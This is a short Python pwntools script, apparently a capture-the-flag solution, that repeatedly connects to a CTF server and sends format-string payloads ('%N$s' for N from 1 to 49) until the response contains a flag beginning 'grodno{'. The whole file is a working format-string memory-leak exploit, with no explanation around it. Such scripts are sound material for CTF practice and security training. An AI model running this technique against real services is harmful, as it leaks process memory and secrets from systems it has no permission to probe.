from pwn import *
context.log_level = 'error'

for i in range(1, 50):
    io = remote('ctf.mf.grsu.by', 9077)
    fmt = f'%{i}$s\n'
    try:
        io.sendline(fmt)
        output = io.recvall(timeout=1).decode()
        if "grodno{" in output:
            print(f'[+] Found flag at %{i}$s → {output.strip()}')
            break
    except Exception as e:
        pass
    finally:
        io.close()
